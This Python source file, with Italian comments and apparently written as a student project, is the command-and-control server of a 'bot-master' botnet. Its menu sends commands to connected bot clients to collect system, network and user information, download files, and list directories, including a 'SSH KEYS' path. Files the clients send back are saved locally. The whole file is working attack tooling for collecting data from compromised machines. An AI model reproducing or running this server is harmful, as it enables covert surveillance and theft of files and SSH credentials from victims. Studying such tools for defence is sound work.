"""
Codice sorgente per la gestione della connessione con il client (bot-master).

Scritto da:
       Valentino Bocchetti, Valentina Annunziata
       Francesco Ciccarelli, Giulia Caputo
Copyright (c) 2022. All rights reserved.
"""
import asyncio  # Non è necessario importare anche socket (asyncio lo fa da solo)
from aioconsole import ainput  # Async console per asyncio
import aiofiles
import re  # Necessario per la codifica della richiesta ricevuta dal client

# Librerie personali
from . import bot_master_utility as bot_master_utils

__response_options = {"1": "OS-TYPE", "2": "CPU-STATS", "3": "RAM", "4": "PARTITION-DISK-INFO", "5": "PARTITION-DISK-STATUS",
                      "6": "IO-CONNECTED", "7": "NETWORK-INFO", "8": "USERS", "9": "DOWNLOAD-FILE", "C": "Content-Path", "q": "QUIT"}

# Definiamo degli header custom per identificare il tipo di dato ricevuto dal client
# Per la gestione della ricezione dei file utilizziamo il seguente formato: <File-Name>NOME_FILE<File-Content>CONTENUTO_FILE
__headers_type = {"1": b"<File-Name>", "2": b"<File-Content>", "3": b"<File-Not-Found>", "4": b"<OS-type>", "5": b"<CPU-stats>", "6": b"<Ram-usage>",
                  "7": b"<Partition-disk-info>", "8": b"<Partition-disk-status>", "9": b"<IO-connected>", "10": b"<Network-info>", "11": b"<Users>",
                  "12": b"<Content-Path>"}

__filesystem_hierarchy_components = {"1": "Root", "2": "Home", "3": "SSH KEYS", "4": "Images", "5": "Documents"}

__buffer_size = 8192


async def handle_bot_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
    """Gestione della connessione e delle richieste da effettuare al client."""
    response = None
    stop_key = "quit"
    while True:
        response = await reader.read(__buffer_size)  # Per ridurre i tempi di attesa aumentiamo il buffer
        if response == stop_key.encode():  # Controlliamo che il client non abbia richiesto una disconnessione (modalità stand-by attiva)
            break
        if not response:
            test_addr, test_port = writer.get_extra_info("peername")
            print(f"Il client {test_addr}:{test_port} ha effettuato una connessione di test per la verifica dello stato del server")
            break
        if response == b"Operazione?":  # Se la response è vuota eseguiamo un comando da inviare al client che si tradurrà in una operazione
            await ask_operation(writer)
        else:
            addr, port = writer.get_extra_info("peername")
            await handle_response(response, addr, port)  # Gestiamo automaticamente le richieste di ricezione file/informazioni sullo stato della macchina
        await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
    writer.close()
    await writer.wait_closed()  # Attendiamo che il client sia chiuso prima di stoppare


async def handle_response(response: bytes, addr: str, port: int) -> None:
    """Funzione di gestione per la response (contenuto di file) ricevuta dal client."""
    if response.startswith(__headers_type["1"]):
        print("Ricezione di un file da parte del client:")

        # In questo modo otteniamo una stringa la response prima dell'header <File-Name> (eliminando il [1] otteniamo una lista con il primo elemento vuoto)
        delete_header = re.split(__headers_type["1"], response)[1]

        name_n_content = re.split(__headers_type["2"], delete_header)  # TODO: Assegnare a 2 variabili il contenuto della lista ottenuta da nome_n_content

        await handle_response_for_files(name_n_content[0], name_n_content[-1])  # La lista è composta da 2 elementi e per semplicità passiamo il primo e l'ultimo elemento in questo modo
    elif response.startswith(__headers_type["3"]):
        print(f'Il file richiesto {re.split(__headers_type["3"], response)[1].decode()} al client è inesistente')  # Decoding del nome del file in place
    else:
        msg = response.decode()
        print(f"Messaggio da {addr}:{port}: {msg!r}")  # Sfruttiamo il Literal String Interpolation (F-String)


async def handle_response_for_files(filename: str, content) -> None:
    """Funzione di gestione per la response (contenuto di file) ricevuta dal client."""
    async with aiofiles.open(filename, "ab+") as file:
        await file.write(content)  # Salviamo nel file il contenuto ricevuto dal client già formattato


async def ask_operation(writer: asyncio.StreamWriter) -> None:
    """Funzione di richiesta dell'operazione da inviare al client da parte del server."""
    bot_master_utils.print_menu(__response_options, "Operazioni disponibili:", 32)
    try:
        request = await ainput(">>> ")
        if request in __response_options.keys():
            print(f"Opzione scelta: {request}")
            chosen_operation = __response_options.get(request)
            if chosen_operation == "Content-Path":
                await ask_content_path(writer)
            else:
                writer.write(chosen_operation.encode())
                await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
        else:
            chosen_operation = "OPERATION_NOT_SUPPORTED"  # Testing nel caso in cui niente di quello inserito dall'utente matchi
            writer.write(chosen_operation.encode())
            await writer.drain()  # Attendiamo che venga eseguito il flush del writer prima di proseguire
        if not writer:
            print("SONO QUI")
    except Exception as e:
        bot_master_utils.info(f"{type(e)}: {e}", 2)
        loop = asyncio.get_event_loop()
        loop.close()


async def ask_content_path(writer: asyncio.StreamWriter) -> None:
    """Gestione della richiesta del contenuto del FS della macchina su cui gira il client."""
    bot_master_utils.print_menu(__filesystem_hierarchy_components, "Path disponibili:", 32)
    try:
        request = await ainput(">>>> ")
        if request in __filesystem_hierarchy_components.keys():
            print(f"Operazione selezionata: {request}")
            chosen_operation = __response_options["C"] + __filesystem_hierarchy_components.get(request)  # TODO: Modificare i values delle response in accordo con gli headers_type
            writer.write(chosen_operation.encode())
    except Exception as e:
        #  TODO: In caso di eccezione ritornare (?)
        bot_master_utils.info(f"{type(e)}: {e}", 2)
        loop = asyncio.get_event_loop()
        loop.close()


async def run_server(hostname: str, port: int) -> None:
    """Esecuzione del loop di gestione della connessione con il client."""
    server = await asyncio.start_server(handle_bot_client, hostname, port)

    async with server:
        # async with server:
        await server.serve_forever()
